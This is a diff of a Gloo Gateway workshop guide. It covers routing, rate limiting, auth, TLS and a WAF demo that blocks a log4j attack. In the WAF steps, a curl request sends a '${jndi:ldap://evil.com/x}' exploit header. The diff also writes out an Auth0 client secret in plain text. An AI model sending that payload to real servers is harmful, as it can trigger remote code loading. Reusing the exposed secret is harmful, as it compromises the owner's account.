@@ -64,7 +64,9 @@ meshctl install --license $GLOO_GATEWAY_LICENSE_KEY --register --version $GLOO_P
 
 ```sh
 kubectl create namespace gloo-gateway
+kubectl label namespace gloo-gateway istio-injection=enabled
 istioctl install --set hub=$ISTIO_IMAGE_REPO --set tag=$ISTIO_IMAGE_TAG  -y  -f install/istio/istiooperator-cluster1.yaml
+# kubectl apply -f install/gloo-gateway/install.yaml
 ```
 
 
@@ -84,7 +86,7 @@ helm upgrade --install gloo-gateway-addons gloo-mesh-agent/gloo-mesh-agent \
   --set ext-auth-service.enabled=true \
   --version $GLOO_PLATFORM_VERSION
 
-kubectl apply -f tracks/addons-servers.yaml
+kubectl apply -f install/gloo-gateway/addons-servers.yaml
 ```
 
 
@@ -161,7 +163,6 @@ spec:
     - selector:
         labels:
           istio: ingressgateway
-        cluster: mgmt-cluster
         namespace: gloo-gateway
   listeners: 
     - http: {}
@@ -183,7 +184,6 @@ spec:
   virtualGateways:
     - name: north-south-gw
       namespace: ops-team
-      cluster: mgmt-cluster
   workloadSelectors: []
   http:
     - name: dev-team-ingress
@@ -217,15 +217,23 @@ spec:
           - ref:
               name: frontend
               namespace: web-ui
-              cluster: mgmt-cluster
             port:
               number: 80
 EOF
 ```
 
+* Open browser
+```
+export GLOO_GATEWAY=$(kubectl -n gloo-gateway get svc gloo-gateway -o jsonpath='{.status.loadBalancer.ingress[0].*}')
+export GLOO_GATEWAY=$GLOO_GATEWAY
+printf "\n\nGloo Gateway available at http://$GLOO_GATEWAY\n"
+```
 
 ## Lab 7 - Routing <a name="Lab-7"></a>
 
+
+
+* Exposing a single service 
 
 ```yaml
 kubectl apply -f - <<'EOF'
@@ -249,15 +257,13 @@ spec:
           - ref:
               name: currencyservice
               namespace: backend-apis
-              cluster: mgmt-cluster
             port:
               number: 7000
 EOF
 ```
 
 ```sh
-grpcurl --plaintext --proto ./install/online-boutique/online-boutique.proto -d '{ "from": { "currency_code": "USD", "nanos": 44637071, "units": "31" }, "to_code": "JPY" }' localhost:8080 hipstershop.CurrencyService/Convert
-
+grpcurl --plaintext --proto ./install/online-boutique/online-boutique.proto -d '{ "from": { "currency_code": "USD", "nanos": 44637071, "units": "31" }, "to_code": "JPY" }' $GLOO_GATEWAY hipstershop.CurrencyService/Convert
 ```
 
 * Request
@@ -322,7 +328,7 @@ spec:
   - name: https
     number: 443
     protocol: HTTPS
-    clientsideTls: {}
+    clientsideTls: {}   ### upgrade outbound call to HTTPS
 ---
 apiVersion: networking.gloo.solo.io/v2
 kind: RouteTable
@@ -352,7 +358,7 @@ EOF
 
 
 ```
-curl -v localhost:8080/httpbin/get
+curl -v $GLOO_GATEWAY/httpbin/get
 ```
 
 
@@ -375,7 +381,7 @@ In this section of the lab, take a quick look at how to prevent the `log4j` expl
 2. Confirm that a malicious JNDI request currently succeeds. Note the `200` success response. Later, you create a WAF policy to block such requests.
 
 ```sh
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$HTTP_GATEWAY_ENDPOINT/httpbin/get
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY/httpbin/get
 ```
 
 3. With the Gloo Mesh WAF policy custom resource, you can create reusable policies for ModSecurity. Review the `log4j` WAF policy and the frontend route table. Note the following settings.
@@ -384,7 +390,7 @@ curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$HTTP_GATEWAY
   * In the WAF policy config, the default core rule set is disabled. Instead, a custom rule set is created for the `log4j` attack.
 
 ```yaml
-kubectl --context ${MGMT} apply -f - <<'EOF'
+kubectl apply -f - <<'EOF'
 apiVersion: security.policy.gloo.solo.io/v2
 kind: WAFPolicy
 metadata:
@@ -411,7 +417,7 @@ EOF
 4. Try the previous request again.
 
 ```sh
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$HTTP_GATEWAY_ENDPOINT/httpbin/get
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY/httpbin/get
 ```
 
 Note that the request is now blocked with the custom intervention message from the WAF policy.
@@ -463,7 +469,6 @@ metadata:
 spec:
   destinationServers:
   - ref:
-      cluster: mgmt-cluster
       name: rate-limiter
       namespace: gloo-gateway-addons
     port:
@@ -490,15 +495,12 @@ spec:
     serverSettings:
       name: rate-limit-server-settings
       namespace: dev-team
-      cluster: mgmt-cluster
     ratelimitClientConfig:
       name: rate-limit-client-config
       namespace: dev-team
-      cluster: mgmt-cluster
     ratelimitServerConfig:
       name: rate-limit-server-config
       namespace: dev-team
-      cluster: mgmt-cluster
     phase:
       preAuthz: { }
 EOF
@@ -507,7 +509,7 @@ EOF
 * Test Rate Limiting
 
 ```sh
-for i in {1..6}; do curl -iksS -X GET http://$HTTP_GATEWAY_ENDPOINT | tail -n 10; done
+for i in {1..6}; do curl -iksS -X GET http://$GLOO_GATEWAY/httpbin/get | tail -n 10; done
 ```
 
 * Expected Response - If you try the Online Boutique UI you will see a blank page because the rate-limit response is in the headers
@@ -597,11 +599,11 @@ EOF
 ```
 
 ```
-curl -v http://localhost:8080/httpbin/get
+curl -v http://$GLOO_GATEWAY/httpbin/get
 
-curl -H "x-api-key: developer" -v http://localhost:8080/httpbin/get
+curl -H "x-api-key: developer" -v http://$GLOO_GATEWAY/httpbin/get
 
-curl -H "x-api-key: admin" -v http://localhost:8080/httpbin/get
+curl -H "x-api-key: admin" -v http://$GLOO_GATEWAY/httpbin/get
 ```
 
 
@@ -669,10 +671,23 @@ spec:
 EOF
 ```
 
-```
-AUTH_TOKEN=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Il82WUZwYko3YTVuWGI1RlZrUEJIYiJ9.eyJpc3MiOiJodHRwczovL2Rldi02NGt0aWJtdi51cy5hdXRoMC5jb20vIiwic3ViIjoiMVFFVmhaMkVScVpPcFRRbkhDaEsxVFVTS1JCZHVPNzJAY2xpZW50cyIsImF1ZCI6Imh0dHBzOi8vaHR0cGJpbi9hcGkiLCJpYXQiOjE2NTY0MjA0MzUsImV4cCI6MTY1NjUwNjgzNSwiYXpwIjoiMVFFVmhaMkVScVpPcFRRbkhDaEsxVFVTS1JCZHVPNzIiLCJzY29wZSI6InJlYWQ6bWVzc2FnZXMiLCJndHkiOiJjbGllbnQtY3JlZGVudGlhbHMifQ.mqvn8oHYkjYgzJ7SDmFRXWdA9UpLUS5At7ZH0ZACJZwEz97_LMUlhzFFTAV_3fo19M1k0sSOghhc_hwd8ZEEfCCFQs6pxKwwMyU0krhUEM4Bpvdf9Ee5FFWIPdXL3G1ZCer2JzAIJNX6l5jYbFUdJLsL27B3fsUjc1GGtL64NImUYoY_doZijlIC2sMY8KxOlJR5xzXyLJrGuLW-ruv7rqMsWtHlVZRSyGQStQ2qHvQBCRheAcpyCVsKtnMY5jIn7XLlxQAgAYIJGnmpQSpkZYB-xysUOfk-cWZEsWHqcrWj38Q0maFN2ny3L8Ny96S0eRFHar6pfUbnpc1Bz_BKgg
-grpcurl -H "Authorization: Bearer ${AUTH_TOKEN}" --plaintext --proto ./install/online-boutique/online-boutique.proto -d '{ "from": { "currency_code": "USD", "nanos": 44637071, "units": "31" }, "to_code": "JPY" }' localhost:8080 hipstershop.CurrencyService/Convert
+```sh
+ACCESS_TOKEN=$(curl -sS --request POST \
+  --url https://dev-64ktibmv.us.auth0.com/oauth/token \
+  --header 'content-type: application/json' \
+  --data '{"client_id":"1QEVhZ2ERqZOpTQnHChK1TUSKRBduO72","client_secret":"J_vl_qgu0pvudTfGppm_PJcQjkgy-kmy5KRCQDj5XHZbo5eFtxmSbpmqYT5ITv2h","audience":"https://httpbin/api","grant_type":"client_credentials"}' | jq -r '.access_token')
 
+printf "\n\n Access Token: $ACCESS_TOKEN\n"
+```
+
+* No Access Token
+
+```sh
+grpcurl --plaintext --proto ./install/online-boutique/online-boutique.proto -d '{ "from": { "currency_code": "USD", "nanos": 44637071, "units": "31" }, "to_code": "JPY" }' $GLOO_GATEWAY hipstershop.CurrencyService/Convert
+```
+
+```sh
+grpcurl -H "Authorization: Bearer ${ACCESS_TOKEN}" --plaintext --proto ./install/online-boutique/online-boutique.proto -d '{ "from": { "currency_code": "USD", "nanos": 44637071, "units": "31" }, "to_code": "JPY" }' $GLOO_GATEWAY hipstershop.CurrencyService/Convert
 ```
 
 
@@ -686,9 +701,11 @@ Another valuable feature of API gateways is integration into your IdP (Identity 
 openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
    -keyout tls.key -out tls.crt -subj "/CN=*"
 
-kubectl -n istio-gateways create secret generic tls-secret \
+kubectl -n gloo-gateway create secret generic tls-secret \
 --from-file=tls.key=tls.key \
 --from-file=tls.crt=tls.crt
+
+rm tls.crt tls.key
 ```
 
 2. Adding HTTPS to our gateway is simple as updating the virtual gateway to use our ssl certificate
@@ -727,8 +744,7 @@ EOF
 3. Test out the new HTTPS endpoint (you may need to allow insecure traffic in your browser. Chrome: Advanced -> Proceed)
 
 ```sh
-export ENDPOINT_HTTPS_GW_CLUSTER1_EXT=$(kubectl -n istio-gateways get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].*}'):443
-echo "Secure Online Boutique URL: https://$ENDPOINT_HTTPS_GW_CLUSTER1_EXT"
+echo "Secure Online Boutique URL: https://$GLOO_GATEWAY"
 ```
 
 4. Finally, we need to deploy our OIDC server keycloak. We provided you with a script to deploy and configure keycloak for our workshop. 
@@ -744,11 +760,10 @@ echo "Secure Online Boutique URL: https://$ENDPOINT_HTTPS_GW_CLUSTER1_EXT"
 Get the keycloak URL and Client ID.
 
 ```sh
-export KEYCLOAK_URL=$(kubectl get configmap -n gloo-mesh keycloak-info -o json | jq -r '.data."keycloak-url"')
 export KEYCLOAK_CLIENTID=$(kubectl get configmap -n gloo-mesh keycloak-info -o json | jq -r '.data."client-id"')
+export KEYCLOAK_URL=http://$(kubectl -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].*}'):9000/auth
 
-echo "Keycloak available at: $KEYCLOAK_URL"
-echo "Keycloak OIDC ClientID: $KEYCLOAK_CLIENTID"
+printf "\n\nKeycloak OIDC ClientID: $KEYCLOAK_CLIENTID\n\nKeycloak URL: $KEYCLOAK_URL\n"
 ```
 
 The `ExtAuthPolicy` defines the provider connectivity including any callback paths that we need to configure on our application.
